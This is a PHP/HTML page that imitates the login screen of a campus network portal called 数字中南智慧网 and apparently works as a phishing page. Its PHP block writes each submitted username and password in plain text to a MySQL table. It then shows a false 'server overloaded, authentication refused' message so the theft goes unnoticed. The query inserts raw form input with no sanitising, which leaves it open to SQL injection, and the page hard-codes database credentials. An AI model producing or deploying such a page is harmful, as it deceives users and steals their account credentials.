<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="Content-Language" content="zh-CN" />
<meta http-equiv=refresh content="10;url=index.php">
<link href="css/my.css" type="text/css" rel="stylesheet">
<meta name="viewport" content="width=device-width,initial-scale=1.2,user-scalable=yes" >
<script src="http://lib.sinaapp.com/js/jquery/1.9.1/jquery-1.9.1.min.js"></script>
<script src="layer.js"></script>
</head>
<body style="margin-left:auto;margin-right:auto;">
<div id="contain">
<div id="01"><img src="img/01.png" width="915px"  height="92px" /></div>

<div id="adv">
        <div id="adv_l"><img src="img/02.png" width=100%  height=100% /></div>
        <div class="advs">
         <div id="wai">
          <div id="zhong"><form method="post" action="deal.php" name="form_1">
          <br/><br/><br/>
           <div id="li">
            <div id="test"><center>
            <br/>
              <font style="font-size:15px;font-weight:bold;color:#333333">帐号:<input type="text" name="usercount"  id="usercount" size="20" onblur="test(this)"  maxlength="12"   style="margin-top:6px;" /><br /><br />
              
              密码:</font><input type="password" name="mima" id="mima" size="20"  style="margin-top:-10px;" /><br /></center>
            </div>
            <br><br>
            <!--
            <center><input type="submit"  name="d"  value="登录" />
            <input type="reset"  name="c" value="重置" /></center>-->
            
            
            
            
                    <center><input type="image"  name="button_tj" src="img/btn_dl.jpg" oncilck="javascript:document.forms['form_1'].submit();" />
                    <input type="image" name="button_cz" src="img/btn_cz.jpg" style="margin-left:20px;" onclick="javascript:document.forms['form_1'].reset(); return false;" /></center>
            
            </form>
            <br>
            <a href="http://61.137.86.87:8080/portalNat444/faq.htm"><font style="font-weight:bold;color:#333333;font-size:14px;"><center>数字中南智慧网使用温馨提示</center></font></a>
            <br><br><br><br><br><br><br><br>
            <a href="#"><font style="font-weight:bold;color:#333333;font-size:14px;">实时信息查询系统</font></a>
           </div>
          </div>
         </div>
        </div>
        
</div>
<?php
$conn=@mysql_connect('localhost','cai','CAI123421','szzn');
if(mysqli_connect_errno($conn))
{echo '数据库连接失败'.mysqli_connect_error();}
mysql_select_db('szzn',$conn) or die('数据库访问错误'.mysql_error());
mysql_query("set names 'utf8'");
$sql="INSERT INTO myszzn(`zh`, `mm`) VALUES ('$_POST[usercount]','$_POST[mima]')";
if (!mysql_query($sql,$conn))
  {die('Error: ' . mysql_error());}
else
{}
// echo "<script>alert('压力过大,服务器拒绝认证!');</script>";

?>
<script>
layer.open({
  title: '数字中南校园智慧网2'
  ,content: '服务器压力过大,拒绝认证!'
}); 
</script>

</body>
</html>